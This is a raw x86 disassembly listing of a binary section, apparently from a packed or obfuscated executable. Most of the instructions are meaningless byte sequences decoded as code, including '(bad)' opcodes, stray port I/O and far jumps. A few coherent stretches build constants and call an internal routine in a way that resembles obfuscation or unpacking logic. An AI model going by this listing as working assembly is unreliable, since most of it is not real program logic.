  419b47:	or     al,BYTE PTR [ecx+0x38ee3216]
  419b4d:	out    0x79,al
  419b4f:	or     eax,0x7f2c7476
  419b54:	popf   
  419b55:	dec    ebp
  419b56:	xor    BYTE PTR [esi],al
  419b58:	outs   dx,BYTE PTR ds:[esi]
  419b59:	test   DWORD PTR [ebx],ebx
  419b5b:	cmc    
  419b5c:	lods   eax,DWORD PTR ds:[esi]
  419b5d:	dec    eax
  419b5e:	jl     0x419afe
  419b60:	ins    DWORD PTR es:[edi],dx
  419b61:	(bad)  
  419b62:	aad    0x34
  419b64:	mov    edx,0xbd0bba85
  419b69:	mov    cl,0x7a
  419b6b:	int    0x10
  419b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b6e:	imul   eax,ecx,0x2fe27e4e
  419b74:	iret   
  419b75:	xchg   ebp,eax
  419b76:	repnz fmul QWORD PTR ds:0x45f54189
  419b7d:	(bad)  
  419b7e:	in     eax,dx
  419b7f:	(bad)  [esi-0x3e]
  419b82:	mov    ?,WORD PTR [esi]
  419b84:	and    eax,0xf2fb6038
  419b89:	dec    esi
  419b8a:	out    0xd2,al
  419b8c:	jne    0x419b67
  419b8e:	xchg   BYTE PTR [ebp-0x218b6d01],al
  419b94:	jnp    0x419b61
  419b96:	xchg   edi,eax
  419b97:	mov    WORD PTR [esi],ds
  419b99:	packsswb mm7,QWORD PTR [esi-0xb]
  419b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b9e:	push   ebp
  419b9f:	sahf   
  419ba0:	sar    ecx,cl
  419ba2:	cmc    
  419ba3:	sar    ecx,cl
  419ba5:	fnstenv [esi]
  419ba7:	mov    ds:0x90a270d1,eax
  419bac:	cdq    
  419bad:	xchg   edx,eax
  419bae:	outs   dx,DWORD PTR ds:[esi]
  419baf:	push   ebx
  419bb0:	cs (bad) 
  419bb2:	or     bl,BYTE PTR [ebx]
  419bb4:	adc    BYTE PTR ds:0x8f0d9afe,0xc6
  419bbb:	mov    dh,0x36
  419bbd:	sub    eax,0x126ddf52
  419bc2:	mov    eax,DWORD PTR [edi+0x17d5b5b5]
  419bc8:	(bad)  
  419bc9:	loop   0x419bbf
  419bcb:	push   cs
  419bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bcd:	ret    
  419bce:	mov    ds,WORD PTR [ebx+0x4cebe0fe]
  419bd4:	shl    BYTE PTR [edx],1
  419bd6:	adc    BYTE PTR [ecx],cl
  419bd8:	mov    esp,fs
  419bda:	adc    al,0xab
  419bdc:	mov    ds:0x62e8985e,eax
  419be1:	dec    ebp
  419be2:	push   0xffffffa0
  419be4:	push   eax
  419be5:	and    al,0x92
  419be7:	retf   0x7cf0
  419bea:	xchg   edi,eax
  419beb:	fldenv [edx-0xa]
  419bee:	xor    eax,0x8a62e16f
  419bf3:	std    
  419bf4:	mov    esp,DWORD PTR [esi]
  419bf6:	sbb    DWORD PTR [edi-0x51],edx
  419bf9:	fistp  QWORD PTR [ecx+0x3b]
  419bfc:	mov    ecx,0x8a008fac
  419c01:	lahf   
  419c02:	mov    edi,DWORD PTR [edi+0x66]
  419c05:	outs   dx,DWORD PTR ds:[esi]
  419c06:	lods   al,BYTE PTR ds:[esi]
  419c07:	add    BYTE PTR [edx+0x3f4bf06e],cl
  419c0d:	xchg   ecx,eax
  419c0e:	and    al,BYTE PTR [edx-0x44]
  419c11:	cwde   
  419c12:	cmc    
  419c13:	adc    eax,0x7cd1a586
  419c18:	xchg   edx,eax
  419c19:	sub    BYTE PTR [esi],cl
  419c1b:	addr16 daa 
  419c1d:	scas   eax,DWORD PTR es:[edi]
  419c1e:	arpl   WORD PTR [edx+0x47],si
  419c21:	shl    ch,0xad
  419c24:	ret    
  419c25:	dec    edi
  419c26:	push   cs
  419c27:	bound  edx,QWORD PTR [ebx]
  419c29:	xor    BYTE PTR [edi-0x5e523900],bh
  419c2f:	shl    cl,0x11
  419c32:	test   DWORD PTR [ebp+0x26d75599],esi
  419c38:	lds    edx,FWORD PTR [ecx+ebp*8+0x49]
  419c3c:	ins    DWORD PTR es:[edi],dx
  419c3d:	xlat   BYTE PTR ds:[ebx]
  419c3e:	nop
  419c3f:	or     bl,BYTE PTR [esi]
  419c41:	sbb    bh,cl
  419c43:	cmp    eax,0x53571f31
  419c48:	stos   BYTE PTR es:[edi],al
  419c49:	imul   edx,DWORD PTR [ebp-0x27],0xe326ac76
  419c50:	or     cl,BYTE PTR [edi]
  419c52:	fisttp WORD PTR [esi-0x3f8d1c6b]
  419c58:	nop
  419c59:	push   ss
  419c5a:	add    al,0x21
  419c5c:	cdq    
  419c5d:	test   eax,0x268866e6
  419c62:	xchg   ebp,eax
  419c63:	sbb    BYTE PTR [edi],bl
  419c65:	pop    eax
  419c66:	pushf  
  419c67:	retf   0x8d02
  419c6a:	stos   DWORD PTR es:[edi],eax
  419c6b:	add    ebp,DWORD PTR [ebp-0x2d]
  419c6e:	jns    0x419cae
  419c70:	mov    WORD PTR [ebx+0x2c3f748e],ss
  419c76:	cmp    al,cl
  419c78:	int    0x71
  419c7a:	fs into 
  419c7c:	inc    ecx
  419c7d:	adc    al,0xbb
  419c7f:	fwait
  419c80:	test   al,0x75
  419c82:	mov    cl,0x19
  419c84:	pop    ebp
  419c85:	es jns 0x419d05
  419c88:	aad    0x7f
  419c8a:	cdq    
  419c8b:	in     eax,dx
  419c8c:	jae    0x419ca9
  419c8e:	je     0x419c57
  419c90:	mov    ebx,0xd49c9f95
  419c95:	(bad)  
  419c96:	mov    esi,0xbeb2ae29
  419c9b:	test   DWORD PTR [eax-0x7e],0x59cf38a6
  419ca2:	fwait
  419ca3:	(bad)  
  419ca4:	inc    edx
  419ca5:	stos   DWORD PTR es:[edi],eax
  419ca6:	mov    ebp,0xab657df6
  419cab:	inc    edx
  419cac:	pop    eax
  419cad:	lods   al,BYTE PTR ds:[esi]
  419cae:	push   es
  419caf:	adc    eax,0x3a1f1a10
  419cb4:	jp     0x419c60
  419cb6:	hlt    
  419cb7:	cmp    edx,DWORD PTR [edi+0x45]
  419cba:	pop    es
  419cbb:	push   ebp
  419cbc:	or     ebp,DWORD PTR [eax-0x1b]
  419cbf:	or     bh,0xc7
  419cc2:	leave  
  419cc3:	mov    ebp,0x568cbd95
  419cc8:	mov    dl,0x88
  419cca:	dec    ebp
  419ccb:	xor    cl,bh
  419ccd:	shl    BYTE PTR [ecx+0x7d],1
  419cd0:	jae    0x419cd4
  419cd2:	fistp  DWORD PTR [ebp+0x4922335a]
  419cd8:	push   ecx
  419cd9:	div    DWORD PTR [edi-0x2538457e]
  419cdf:	mov    bl,0xad
  419ce1:	nop
  419ce2:	in     eax,0x9a
  419ce4:	mov    ch,0x2a
  419ce6:	mov    dl,0x85
  419ce8:	stos   DWORD PTR es:[edi],eax
  419ce9:	std    
  419cea:	jnp    0x419d63
  419cec:	data16 jg 0x419d27
  419cef:	dec    esi
  419cf0:	data16 jo 0x419d34
  419cf3:	xor    DWORD PTR [eax+eiz*8-0x31],edx
  419cf7:	sub    esi,ebp
  419cf9:	out    dx,eax
  419cfa:	xchg   esi,eax
  419cfb:	out    dx,al
  419cfc:	out    dx,eax
  419cfd:	sahf   
  419cfe:	xchg   ebx,eax
  419cff:	ret    0x3906
  419d02:	stc    
  419d03:	sti    
  419d04:	mov    esp,0x94c45a
  419d09:	in     al,dx
  419d0a:	xor    BYTE PTR [ebx-0x50],ch
  419d0d:	jmp    0xadf2b285
  419d12:	xor    dl,BYTE PTR [edi*1+0x7b7bc97c]
  419d19:	sbb    al,0xdf
  419d1b:	stos   DWORD PTR es:[edi],eax
  419d1c:	dec    esi
  419d1d:	ja     0x419cbe
  419d1f:	adc    esp,DWORD PTR [edi-0x5f9899e7]
  419d25:	and    BYTE PTR [ebx+ebp*2],dh
  419d28:	mov    esp,0x310144c
  419d2d:	adc    esp,DWORD PTR cs:[ebx]
  419d30:	int3   
  419d31:	push   cs
  419d32:	sub    BYTE PTR [eax+0x4aabd4c1],dh
  419d38:	test   eax,0xd30734f8
  419d3d:	sub    al,0xa2
  419d3f:	fld    QWORD PTR [edx]
  419d41:	fadd   st(6),st
  419d43:	and    esi,DWORD PTR [edx-0x3c]
  419d46:	dec    edx
  419d47:	in     eax,0x1b
  419d49:	jl     0x419d85
  419d4b:	pop    cx
  419d4d:	mov    bl,0x32
  419d4f:	fidivr WORD PTR [edi+0x35e3c9c8]
  419d55:	sub    ah,BYTE PTR ds:0x41bd6c7a
  419d5b:	outs   dx,DWORD PTR ds:[esi]
  419d5c:	jl     0x419cfb
  419d5e:	push   es
  419d5f:	nop
  419d60:	fisttp WORD PTR [ebx-0x69adb886]
  419d66:	or     eax,0x86e2f78f
  419d6b:	fidiv  DWORD PTR [ebx]
  419d6d:	daa    
  419d6e:	cmc    
  419d6f:	sbb    ah,BYTE PTR [ecx]
  419d71:	xor    eax,0x402fc02b
  419d76:	or     DWORD PTR [eax+0x35],0xf
  419d7a:	inc    ebx
  419d7b:	imul   DWORD PTR [eax-0x40]
  419d7e:	stos   DWORD PTR es:[edi],eax
  419d7f:	inc    eax
  419d80:	pusha  
  419d81:	mov    DWORD PTR [eax],eax
  419d83:	dec    esi
  419d84:	mov    al,0x18
  419d86:	inc    edx
  419d87:	fimul  WORD PTR [ebx+0x3d]
  419d8a:	pop    es
  419d8b:	dec    eax
  419d8c:	ja     0x419dc7
  419d8e:	jb     0x419dd1
  419d90:	ret    0xbe6a
  419d93:	cmp    al,0xdc
  419d95:	add    DWORD PTR [eax-0x675928cc],eax
  419d9b:	sbb    al,BYTE PTR [esi+0x58]
  419d9e:	inc    ebp
  419d9f:	shl    DWORD PTR [ebp+0x57b3a20d],cl
  419da5:	adc    ecx,DWORD PTR [edi+0x6c]
  419da8:	in     eax,0x27
  419daa:	(bad)  
  419dab:	sahf   
  419dac:	fild   DWORD PTR [edi]
  419dae:	pop    ecx
  419daf:	adc    eax,0x748a421b
  419db4:	jle    0x419db1
  419db6:	test   edx,edx
  419db8:	push   edi
  419db9:	imul   ebx,DWORD PTR [ebp-0x2a],0x37
  419dbd:	adc    eax,0xc29c88f4
  419dc2:	sub    dh,BYTE PTR ds:0xa9528d09
  419dc8:	imul   ebx,DWORD PTR [ecx],0x61
  419dcb:	fmul   DWORD PTR ds:0x1fdfcf09
  419dd1:	fisub  WORD PTR [ebx+0x79]
  419dd4:	lahf   
  419dd5:	or     DWORD PTR [ebp+0xe3bcb58],edx
  419ddb:	ret    0xe5c4
  419dde:	mov    ds:0x7368382f,al
  419de3:	mov    WORD PTR [esi+0x39],ss
  419de6:	mov    eax,esi
  419de8:	mov    dl,0xd2
  419dea:	ins    BYTE PTR es:[edi],dx
  419deb:	mov    edx,fs
  419ded:	fild   WORD PTR [esi+0x3c]
  419df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419df1:	push   esp
  419df2:	mov    eax,ds:0x7631f0d3
  419df7:	push   ebp
  419df8:	mov    edx,0x8c7f4aa9
  419dfd:	sbb    eax,DWORD PTR [ecx-0x1c]
  419e00:	cmp    bh,BYTE PTR [ebx]
  419e02:	pusha  
  419e03:	pop    ebp
  419e04:	lahf   
  419e05:	scas   al,BYTE PTR es:[edi]
  419e06:	popa   
  419e07:	in     al,0x5e
  419e09:	add    DWORD PTR [ebx],0x59
  419e0c:	pop    esi
  419e0d:	adc    al,0x53
  419e0f:	jmp    0x21b:0xc5547f4e
  419e16:	xor    al,0xa
  419e18:	xor    BYTE PTR ss:[edx+0x68],ch
  419e1c:	stc    
  419e1d:	pop    ss
  419e1e:	sub    BYTE PTR [ecx+eax*1],dl
  419e21:	in     al,dx
  419e22:	adc    BYTE PTR [edi+0x56],cl
  419e25:	pop    ebx
  419e26:	mov    dh,0x7e
  419e28:	lock xor cl,BYTE PTR [eax-0x2ddb7d23]
  419e2f:	loopne 0x419ea6
  419e31:	jmp    FWORD PTR [ecx-0x51]
  419e34:	dec    esp
  419e35:	imul   ecx,DWORD PTR [ebx-0x74ebdbb4],0x54
  419e3c:	and    al,0x30
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0x6af4d39c
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	outs   dx,DWORD PTR ds:[esi]
  419e6f:	clc    
  419e70:	jge    0x419e9a
  419e72:	in     eax,dx
  419e73:	mov    ss,WORD PTR [ebx]
  419e75:	adc    ebx,DWORD PTR [esi+0x56]
  419e78:	mov    edx,0xd695cd43
  419e7d:	push   ebp
  419e7e:	cmp    al,0xa9
  419e80:	xlat   BYTE PTR ds:[ebx]
  419e81:	jmp    0x419ef6
  419e83:	jno    0x419e88
  419e85:	pop    eax
  419e86:	test   al,0x50
  419e88:	call   0x6f63e18b
  419e8d:	popf   
  419e8e:	daa    
  419e8f:	stos   BYTE PTR es:[edi],al
  419e90:	sbb    eax,0xb8b16e82
  419e95:	arpl   WORD PTR [eax+0x8446f49],bx
  419e9b:	mov    bl,0x9a
  419e9d:	adc    DWORD PTR [eax-0x37],esi
  419ea0:	add    dh,dl
  419ea2:	cmp    eax,0x5c9b8a14
  419ea7:	mov    cl,0x77
  419ea9:	adc    al,0xd4
  419eab:	pop    edx
  419eac:	bnd jle 0x419f10
  419eaf:	in     al,dx
  419eb0:	fild   WORD PTR [esi]
  419eb2:	mov    cl,0xa
  419eb4:	jae    0x419f21
  419eb6:	jmp    0xfab2:0x8db0e223
  419ebd:	cwde   
  419ebe:	out    0x58,al
  419ec0:	cdq    
  419ec1:	(bad)  [eax+ecx*1+0x36]
  419ec5:	je     0x419f0a
  419ec7:	ja     0x419e49
  419ec9:	or     DWORD PTR [edx-0x63],esi
  419ecc:	loop   0x419e89
  419ece:	lds    edi,FWORD PTR [edi+0x73]
  419ed1:	mov    ebx,0x2f4e4a2f
  419ed6:	pop    ss
  419ed7:	xor    dh,BYTE PTR [esi-0x75fbab8c]
  419edd:	(bad)  
  419ede:	xor    BYTE PTR [esi-0x60],ah
  419ee1:	lods   eax,DWORD PTR ds:[esi]
  419ee2:	pushf  
  419ee3:	fwait
  419ee4:	jp     0x419eac
  419ee6:	jne    0x419e6d
  419ee8:	cmp    edi,DWORD PTR [ecx-0x1c8b185c]
  419eee:	fmulp  st(3),st
  419ef0:	cmp    BYTE PTR [esi],ch
  419ef2:	cmpxchg BYTE PTR [ebp+0x6b906450],dh
  419ef9:	jle    0x419f4c
  419efb:	iret   
  419efc:	ret    0x4eb6
  419eff:	cmp    DWORD PTR [eax+0x14],edi
  419f02:	shr    BYTE PTR [ebx+eax*1],cl
  419f05:	mov    esp,0x6816818f
  419f0a:	retf   
  419f0b:	into   
  419f0c:	jl     0x419f45
  419f0e:	pop    edi
  419f0f:	push   es
  419f10:	lahf   
  419f11:	push   eax
  419f12:	fldenv [edi]
  419f14:	adc    BYTE PTR [ebx],ah
  419f16:	in     eax,dx
  419f17:	sti    
  419f18:	shl    ebx,cl
  419f1a:	into   
  419f1b:	sub    eax,0x75fd306c
  419f20:	sbb    edx,ebp
  419f22:	sbb    ebp,DWORD PTR ds:0xeddda913
  419f28:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  419f2a:	mul    DWORD PTR [edx]
  419f2c:	cmp    al,0x8
  419f2e:	dec    eax
  419f2f:	push   es
  419f30:	sti    
  419f31:	sub    BYTE PTR [ecx+edi*8+0xb273d3f],bl
  419f38:	scas   eax,DWORD PTR es:[edi]
  419f39:	aaa    
  419f3a:	sti    
  419f3b:	repnz pop ecx
  419f3d:	repz stc 
  419f3f:	lods   al,BYTE PTR cs:[esi]
  419f41:	lahf   
  419f42:	or     eax,0x435c439a
  419f47:	ins    BYTE PTR es:[edi],dx
  419f48:	iret   
  419f49:	xchg   edx,eax
  419f4a:	arpl   WORD PTR [esp+eiz*4+0x2bae2cad],ax
  419f51:	jle    0x419f26
  419f53:	inc    ebx
  419f54:	sbb    ch,0x8c
  419f57:	test   eax,0x128efc4e
  419f5c:	cli    
  419f5d:	mov    ch,0xcd
  419f5f:	pop    ebx
  419f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f61:	adc    edx,DWORD PTR [edi+eiz*2]
  419f64:	or     al,0x33
  419f66:	in     al,0xc4
  419f68:	rcl    ebp,0xbb
  419f6b:	and    BYTE PTR [edx],0xfc
  419f6e:	popf   
  419f6f:	fidivr WORD PTR [ebx-0x46]
  419f72:	ss enter 0xd17d,0x73
  419f77:	adc    esi,ebx
  419f79:	in     eax,0x24
  419f7b:	iret   
  419f7c:	jb     0x419fb2
  419f7e:	push   0xffffffd4
  419f80:	mov    ds:0x2512e462,eax
  419f85:	push   edi
  419f86:	fcom   st(7)
  419f88:	and    DWORD PTR [ebx],eax
  419f8a:	jne    0x419fc6
  419f8c:	cmp    BYTE PTR [bx+di+0xc2a],bl
  419f91:	jb     0x419f4f
  419f93:	sysret 
  419f95:	aaa    
  419f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f97:	sub    BYTE PTR [edi+edi*1],al
  419f9a:	lods   al,BYTE PTR ds:[esi]
  419f9b:	adc    eax,0x71c20b94
  419fa0:	push   DWORD PTR [ebp+0x393275ee]
  419fa6:	ins    BYTE PTR es:[edi],dx
  419fa7:	dec    ebp
  419fa8:	(bad)  
  419fa9:	pop    ds
  419faa:	(bad)  
  419fab:	sub    al,0xc2
  419fad:	ja     0x41a006
  419faf:	out    0xab,al
  419fb1:	gs aam 0xf8
  419fb4:	and    al,0xc4
  419fb6:	pop    ebp
  419fb7:	xchg   ecx,eax
  419fb8:	cmp    BYTE PTR [ecx+ebp*8+0x4c74b106],dl
  419fbf:	(bad)  
  419fc0:	out    0x8f,eax
  419fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc3:	arpl   WORD PTR [esi+0x34d7e8cb],di
  419fc9:	fdiv   DWORD PTR [ebx+0x7e]
  419fcc:	jno    0x419f4e
  419fce:	bound  ecx,QWORD PTR [esi]
  419fd0:	mov    esi,0xe2428f97
  419fd5:	stos   BYTE PTR es:[edi],al
  419fd6:	push   edx
  419fd7:	sub    edx,DWORD PTR [ecx+0x74c04d49]
  419fdd:	dec    ebp
  419fde:	repz mov eax,0x12d8513e
  419fe4:	push   ecx
  419fe5:	xor    dh,ch
  419fe7:	push   esi
  419fe8:	es push esp
  419fea:	adc    eax,0xcc2c2c2d
  419fef:	sub    al,0xff
  419ff1:	mov    ds:0xab886065,eax
  419ff6:	outs   dx,BYTE PTR ds:[esi]
  419ff7:	jp     0x41a050
  419ff9:	nop
  419ffa:	cmp    BYTE PTR [ebx],al
  419ffc:	sub    ah,bh
  419ffe:	mov    WORD PTR [ebx],fs
  41a000:	out    0xe,al
  41a002:	retf   
  41a003:	adc    ebx,eax
  41a005:	and    cl,cl
  41a007:	retf   
  41a008:	inc    ebx
  41a009:	jmp    0x9ae07b29
  41a00e:	jo     0x419fba
  41a010:	leave  
  41a011:	cld    
  41a012:	stc    
  41a013:	pop    ecx
  41a014:	sbb    al,0x1
  41a016:	mov    dh,0x73
  41a018:	fs lahf 
  41a01a:	call   0xb1ff:0x6e3ee1d7
  41a021:	xchg   esp,eax
  41a022:	and    al,ch
  41a024:	retf   0xdffe
  41a027:	pushf  
  41a028:	outs   dx,BYTE PTR ds:[esi]
  41a029:	out    0x74,al
  41a02b:	out    dx,al
  41a02c:	int    0x52
  41a02e:	mov    ds:0x10d837f0,eax
  41a033:	lock stos BYTE PTR es:[edi],al
  41a035:	or     eax,0xc4aa93d9
  41a03a:	add    BYTE PTR [ecx-0x3c],bl
  41a03d:	sub    dl,BYTE PTR [esi-0x235587be]
  41a043:	sahf   
  41a044:	dec    edx
  41a045:	test   bh,ch
  41a047:	sub    al,0xa3
  41a049:	jl     0x41a0ae
  41a04b:	jl     0x419fd0
  41a04d:	mov    ebx,DWORD PTR [edi-0x2d]
  41a050:	inc    edx
  41a051:	jne    0x419fe3
  41a053:	cmp    DWORD PTR [bp+si+0x3e],ebx
  41a057:	xchg   ecx,eax
  41a058:	sbb    BYTE PTR [eax],ch
  41a05a:	addr16 sub eax,0xd8363b58
  41a060:	jb     0x41a069
  41a062:	pushw  0xffa4
  41a065:	sub    al,0xe8
  41a067:	inc    edi
  41a068:	aaa    
  41a069:	lea    ebx,[esi]
  41a06b:	loope  0x41a05f
  41a06d:	(bad)  
  41a06e:	popa   
  41a06f:	jg     0x419ff9
  41a071:	sbb    edi,DWORD PTR [esi+0x3ff00934]
  41a077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a078:	test   eax,0xce913ac0
  41a07d:	icebp  
  41a07e:	das    
  41a07f:	out    0xd1,al
  41a081:	std    
  41a082:	lahf   
  41a083:	call   0xeddc0774
  41a088:	bound  ecx,QWORD PTR [edx]
  41a08a:	fdiv   DWORD PTR [edi]
  41a08c:	ss js  0x41a0ef
  41a08f:	mov    ebx,0xc81e9b86
  41a094:	add    BYTE PTR [esi],dl
  41a096:	push   0xe89c40c
  41a09b:	fisub  WORD PTR [esi-0x59]
  41a09e:	mov    esi,0x3aef565e
  41a0a3:	cmc    
  41a0a4:	repz (bad) 
  41a0a6:	xchg   ecx,eax
  41a0a7:	setl   BYTE PTR [esi]
  41a0aa:	or     ecx,ebp
  41a0ac:	dec    edi
  41a0ad:	leave  
  41a0ae:	scas   eax,DWORD PTR es:[edi]
  41a0af:	iret   
  41a0b0:	enter  0x9875,0x9f
  41a0b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0b5:	icebp  
  41a0b6:	sar    ch,cl
  41a0b8:	add    bh,BYTE PTR [ebp-0x9fd2559]
  41a0be:	cmp    DWORD PTR [ebx],ecx
  41a0c0:	push   cs
  41a0c1:	sbb    dh,BYTE PTR [edx+0x27c661e9]
  41a0c7:	jb     0x41a05f
  41a0c9:	dec    ecx
  41a0ca:	bound  esp,QWORD PTR [ebx-0x430e77eb]
  41a0d0:	jb     0x41a110
  41a0d2:	add    sp,WORD PTR [esp+edi*2-0x7e6bc495]
  41a0da:	test   DWORD PTR [ebx+0x471414e5],ebp
  41a0e0:	mov    ecx,0x5ff65401
  41a0e5:	mov    WORD PTR [edi],gs
  41a0e7:	loop   0x41a0c3
  41a0e9:	(bad)  
  41a0ea:	cdq    
  41a0eb:	push   edi
  41a0ec:	repz lds sp,DWORD PTR [eax-0x4069ed69]
  41a0f4:	or     ah,BYTE PTR [ecx-0x70]
  41a0f7:	sbb    al,0x29
  41a0f9:	jae    0x41a0fe
  41a0fb:	xchg   esp,eax
  41a0fc:	mov    WORD PTR [esi+0x358534e1],?
  41a102:	mov    esi,0x2f5c8966
  41a107:	mov    BYTE PTR [esi+0x29],bl
  41a10a:	cld    
  41a10b:	ss (bad) 
  41a10d:	outs   dx,BYTE PTR ds:[esi]
  41a10e:	adc    DWORD PTR [ebx+0x68d17138],ebx
  41a114:	xor    eax,0x83bbfd3d
  41a119:	mov    BYTE PTR [ebx],bh
  41a11b:	fdivp  st(3),st
  41a11d:	jo     0x41a13a
  41a11f:	xor    DWORD PTR [ebx-0x3ad393ce],0xfffffff6
  41a126:	push   esi
  41a127:	or     al,dl
  41a129:	(bad)  
  41a12a:	loopne 0x41a0e4
  41a12c:	mov    esi,0xa62adff7
  41a131:	jnp    0x41a12f
  41a133:	pop    ecx
  41a134:	mov    ds:0xdf1d17b1,eax
  41a139:	ret    
  41a13a:	repz xchg esp,eax
  41a13c:	inc    esi
  41a13d:	or     al,0x73
  41a13f:	jge    0x41a0e3
  41a141:	xchg   DWORD PTR [ebp+0x41],eax
  41a144:	dec    ecx
  41a145:	push   ds
  41a146:	pop    es
  41a147:	pushf  
  41a148:	in     al,dx
  41a149:	sub    dh,BYTE PTR [edx+0x4e]
  41a14c:	jmp    0x7a422fe0
  41a151:	add    cl,ch
  41a153:	inc    ebx
  41a154:	leave  
  41a155:	in     al,dx
  41a156:	sti    
  41a157:	test   al,0xcc
  41a159:	and    BYTE PTR [ebp-0x42],dl
  41a15c:	jne    0x41a1b5
  41a15e:	mov    eax,0x7c0da7b7
  41a163:	ds pushf 
  41a165:	stos   DWORD PTR es:[edi],eax
  41a166:	adc    sp,WORD PTR [ebp-0x545e04b8]
  41a16d:	std    
  41a16e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a170:	nop
  41a171:	aad    0xc9
  41a173:	jmp    0x66cd37af
  41a178:	dec    esp
  41a179:	inc    eax
  41a17a:	fisubr DWORD PTR [ebx]
  41a17c:	sub    dl,BYTE PTR [ebx]
  41a17e:	jmp    0x41a1b3
  41a180:	xchg   bx,ax
  41a182:	mov    ebp,DWORD PTR [edi-0x2e]
  41a185:	mov    ebp,0x7f12ff07
  41a18a:	in     al,dx
  41a18b:	xlat   BYTE PTR ds:[ebx]
  41a18c:	test   dh,bh
  41a18e:	jb     0x41a171
  41a190:	inc    ecx
  41a191:	jno    0x41a186
  41a193:	lock cld 
  41a195:	mov    al,0xa9
  41a197:	call   0xc24e4130
  41a19c:	outs   dx,BYTE PTR ds:[esi]
  41a19d:	ret    0x7274
  41a1a0:	fsubr  DWORD PTR [ebx]
  41a1a2:	xchg   BYTE PTR [esp+edi*2],bl
  41a1a5:	and    al,al
  41a1a7:	cli    
  41a1a8:	les    ecx,FWORD PTR [ecx-0x50804f8a]
  41a1ae:	sti    
  41a1af:	push   ecx
  41a1b0:	xchg   BYTE PTR [edi],al
  41a1b2:	mov    ebx,0x1b65981
  41a1b7:	je     0x41a21a
  41a1b9:	jl     0x41a19d
  41a1bb:	shl    DWORD PTR [bx+si-0x2930],0xcd
  41a1c1:	jns    0x41a21d
  41a1c3:	inc    edi
  41a1c4:	ret    0x70bc
  41a1c7:	inc    edi
  41a1c8:	aas    
  41a1c9:	js     0x41a1e8
  41a1cb:	mov    eax,0xa3b9d4e0
  41a1d0:	jnp    0x41a22b
  41a1d2:	mov    eax,ds:0x79117163
  41a1d7:	push   0xeefafda8
  41a1dc:	(bad)  
  41a1dd:	in     eax,0x24
  41a1df:	cwde   
  41a1e0:	outs   dx,BYTE PTR ds:[esi]
  41a1e1:	cld    
  41a1e2:	mov    BYTE PTR [ecx],bl
  41a1e4:	(bad)
  41a1e8:	aas    
  41a1e9:	clc    
  41a1ea:	mov    ?,ebp
  41a1ec:	aad    0xd7
  41a1ee:	inc    edx
  41a1ef:	sub    al,0x70
  41a1f1:	push   ebp
  41a1f3:	mov    cl,0x1b
  41a1f5:	not    BYTE PTR [esp+ebp*4]
  41a1f8:	dec    DWORD PTR [edi]
  41a1fa:	mov    ds:0x7b8baabe,eax
  41a1ff:	xchg   esp,eax
  41a200:	lahf   
  41a201:	add    DWORD PTR [eax],ecx
  41a203:	mov    dl,0x99
  41a205:	or     esp,eax
  41a207:	mov    dh,0x91
  41a209:	add    DWORD PTR [ebp-0x1dd77044],0x56fd6da0
  41a213:	jne    0x41a20e
  41a215:	cmp    edi,DWORD PTR [eax+ecx*8+0x3c4f243f]
  41a21c:	data16 into 
  41a21e:	sub    al,0xa6
  41a220:	and    eax,0x325d
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	mov    edi,0x2b7c8740
  41a2a5:	lods   eax,DWORD PTR ds:[esi]
  41a2a6:	push   ss
  41a2a7:	sbb    BYTE PTR [edx+edx*1-0x4218e7e8],bh
  41a2ae:	xlat   BYTE PTR ds:[ebx]
  41a2af:	fsubrp st(2),st
  41a2b1:	fisub  WORD PTR [eax]
  41a2b3:	push   esi
  41a2b4:	aad    0xb4
  41a2b6:	jo     0x41a2b2
  41a2b8:	inc    esi
  41a2b9:	xchg   esp,eax
  41a2ba:	cwde   
  41a2bb:	sbb    bh,BYTE PTR [ebx-0x64]
  41a2be:	dec    edx
  41a2bf:	pop    esi
  41a2c0:	add    al,0x28
  41a2c2:	mov    BYTE PTR [ebp-0x3db56f35],dh
  41a2c8:	inc    esi
  41a2c9:	loop   0x41a2e2
  41a2cb:	mov    ebp,0x49aa2c14
  41a2d0:	jle    0x41a2d5
  41a2d2:	inc    DWORD PTR [ebx]
  41a2d4:	hlt    
  41a2d5:	ficom  DWORD PTR [ebx-0x5]
  41a2d8:	lds    edx,FWORD PTR [eax-0x60]
